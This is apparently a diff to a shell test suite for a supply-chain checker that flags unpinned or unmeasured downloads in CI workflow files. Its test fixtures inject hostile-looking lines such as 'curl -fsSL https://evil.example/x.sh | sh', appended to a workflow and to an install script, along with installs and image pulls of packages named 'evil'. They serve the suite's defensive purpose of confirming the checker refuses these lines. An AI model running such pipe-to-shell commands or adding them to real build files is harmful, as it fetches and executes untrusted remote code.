@@ -398,7 +398,7 @@ import importlib.util, sys
 spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
 f = {".github/workflows/a.yml": "x: npm install left-pad\ny: sudo apt-get install -y skopeo\nz: gh release download v1\nw: pip install git+https://x/y@z\nv: curl -O https://example.org/t.tgz\n"}
 whats = {k[1] for k in inv.unmeasured(f)}
-assert whats == {"a package-manager install", "an apt install", "a gh release download", "a pip install from a URL", "a download from a non-release URL"}, whats
+assert whats == {"a package-manager install", "a system package install", "a gh release or extension download", "a pip install from a URL", "a download from a non-release URL"}, whats
 PY
 
 CASE="inventory: docker run with a quoted image, with --cpus 2, and bare pip install names are items; a range, (unpinned) or an expression is NEVER a pin that can pass the age check"
@@ -474,7 +474,7 @@ check test "$rc" -eq 1; check grep -q 'unmeasured:.github/workflows/ci.yml' "$wo
 newcase cont "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: |\n          curl -fsSL \\\n            https://evil.example/x.sh | sh\n          sudo apt-get -y install foo\n          npm -g install bar\n      - run: |')"
 runck cont '{"times": {}}'
 CASE="continuation lines, apt-get -y install and npm -g install are all recognised as unmeasured forms and refused"
-check test "$rc" -eq 1; check grep -q 'a download from a non-release URL' "$work/cont.out"; check grep -q 'an apt install' "$work/cont.out"; check grep -q 'a package-manager install' "$work/cont.out"
+check test "$rc" -eq 1; check grep -q 'a download from a non-release URL' "$work/cont.out"; check grep -q 'a system package install' "$work/cont.out"; check grep -q 'a package-manager install' "$work/cont.out"
 newcase scanner "$(printf 'import pathlib\np = pathlib.Path(\"bin/install-scanner.sh\")\np.write_text(p.read_text() + \"curl -fsSL https://evil.example/x.sh | sh\\n\")')"
 runck scanner '{"times": {}}'
 CASE="a download appended to bin/install-scanner.sh is refused too (the file is read for unmeasured forms as well as its *_VER pins)"
@@ -554,6 +554,23 @@ newcase bigagent "$(printf 'import pathlib\npathlib.Path(\".github/agent\").mkdi
 runck bigagent '{"times": {}}'
 CASE="a hostile download added next to a 1.1 MB script under .github/agent/ is still refused (the oversize file is skipped there, never turning the scan off)"
 check test "$rc" -eq 1; check grep -q 'unmeasured:.github/workflows/ci.yml' "$work/bigagent.out"
+
+CASE="every fetching spelling is either MEASURED or REFUSED when added, never silent: docker container/image subcommands, podman/nerdctl, git clone, dnf/yum/apk/snap/conda installs, dotnet tool, helm repo add, kubectl apply from a URL, gh extension, cargo binstall, npm exec, bunx, pip download from a URL, a scheme-less wget, go install with a variable module"
+check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
+import importlib.util, sys
+spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
+lines = ["docker container run --rm evil/x:latest", "docker image pull evil/x:latest", "docker --context x run evil/x:latest", "podman run evil/x:latest", "nerdctl run evil/x:latest",
+         "docker build https://example.org/ctx.git", "git clone https://github.com/evil/x", "dnf install -y evilpkg", "yum install evilpkg", "apk add evilpkg", "snap install evil",
+         "conda install evil", "dotnet tool install evil", "helm repo add evil https://example.org", "kubectl apply -f https://example.org/x.yaml", "gh extension install evil/x",
+         "cargo binstall evil", "npm exec evil", "bunx evil", "pip download https://example.org/x.whl", "wget get.example.com/x.sh", "go install ${TOOL}@v9.9.9"]
+for ln in lines:
+    f = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + ln + "\n"}
+    items = inv.inventory(f); um = inv.unmeasured(f)
+    assert items or um, ("silent: " + ln)
+# a line the inventory MEASURES is not also an unmeasured form
+f = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker run alpine@sha256:" + "a" * 64 + " true\n"}
+assert inv.inventory(f) and not inv.unmeasured(f)
+PY
 
 # --- live mode (no fixtures) against a stub gh: a rate limit is "could not look" (exit 2), a 404 is "no proof" (exit 1); neither is ever a pass -------------------------
 mkdir -p "$work/stubbin"
